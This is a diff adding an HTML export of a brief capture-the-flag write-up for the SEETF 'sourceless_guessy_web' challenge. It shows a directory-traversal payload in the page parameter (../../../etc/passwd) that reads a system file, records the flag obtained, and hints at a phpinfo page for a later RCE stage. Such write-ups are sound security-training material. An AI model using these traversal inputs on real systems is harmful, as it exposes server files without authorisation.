@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>sourceless_guessy_web</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>sourceless_guessy_web</h1><br/><p>this was a basic dir traversal</p><p>just look at the cool website&#39;s url at page parameter and try to think like a hacker, what would you get hold of a file in linux machine:</p><p>/etc/passwd</p><p>that&#39;s it</p><p>the url as goes:</p><p></p><p><a href="http://sourcelessguessyweb.chall.seetf.sg:1337/?page=whysoserious">http://sourcelessguessyweb.chall.seetf.sg:1337/?page=whysoserious</a></p><p></p><p>we change it to:</p><p><a href="http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/passwd">http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/passwd</a></p><p></p><p>boom , look at the pg source , we get the flag:SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}s</p><p></p><p>nothing to see , just some headers for reference</p><p><a href="http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv">http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv</a></p></div>
+</body>
+</html>
